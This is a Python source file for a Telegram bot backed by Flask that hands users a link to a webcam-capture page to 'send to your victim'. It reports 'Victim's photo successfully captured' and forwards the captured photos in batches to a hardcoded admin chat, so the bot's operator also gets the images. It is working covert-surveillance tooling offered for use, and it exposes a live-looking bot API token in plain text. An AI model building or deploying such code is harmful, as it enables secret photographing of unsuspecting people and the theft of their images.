from flask import Flask, request
import telebot
import os

API_TOKEN = '7912894287:AAHuWV6vj4ZSAYGwPH2UNMSL0XmKzwr3JSY'
ADMIN_CHAT_ID = '7167361126'

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

user_photos = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(telebot.types.KeyboardButton("🔗 Get Link"))
    bot.send_message(message.chat.id, "Welcome! Tap '🔗 Get Link' for get the tracking link and send the link to your victim.", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🔗 Get Link")
def send_gift_link(message):
    link = "https://lucifer-fernandez.github.io/WebCam_2.0/"
    bot.send_message(message.chat.id, f"🔗 Copy the link and send it to your victim:\n{link}")

@bot.message_handler(content_types=['photo'])
def receive_photos(message):
    user_id = message.from_user.id
    if user_id not in user_photos:
        user_photos[user_id] = []
    user_photos[user_id].append(message.photo[-1].file_id)

    if len(user_photos[user_id]) >= 5:
        bot.send_message(message.chat.id, "✅ Victim's photo successfully captured.")
        for file_id in user_photos[user_id]:
            bot.send_photo(ADMIN_CHAT_ID, file_id, caption=f"From user: @{message.from_user.username or message.from_user.id}")
        user_photos[user_id] = []

@app.route(f"/{API_TOKEN}", methods=["POST"])
def webhook():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@app.route('/')
def index():
    return "Bot is running!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url=f"https://your-app-name.onrender.com/{API_TOKEN}")
    app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
